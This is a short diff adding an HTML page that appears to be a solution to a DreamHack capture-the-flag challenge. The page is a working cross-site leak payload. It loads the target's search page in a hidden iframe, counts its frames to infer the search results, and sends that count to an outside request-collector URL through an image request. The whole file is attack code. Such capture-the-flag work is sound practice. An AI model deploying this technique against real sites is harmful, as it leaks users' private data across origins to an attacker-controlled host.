@@ -1,0 +1,10 @@
+<img id="image">
+<iframe id="frame"></iframe>
+<script>
+    var iframe =  document.getElementById("frame");
+    iframe.src = 'http://host3.dreamhack.games:18236/search?query=DreamHack';
+
+    iframe.onload = () => {
+        document.getElementById("image").src = "https://ena4gusnyxj5.x.pipedream.net?" + iframe.contentWindow.frames.length;
+    };
+</script>
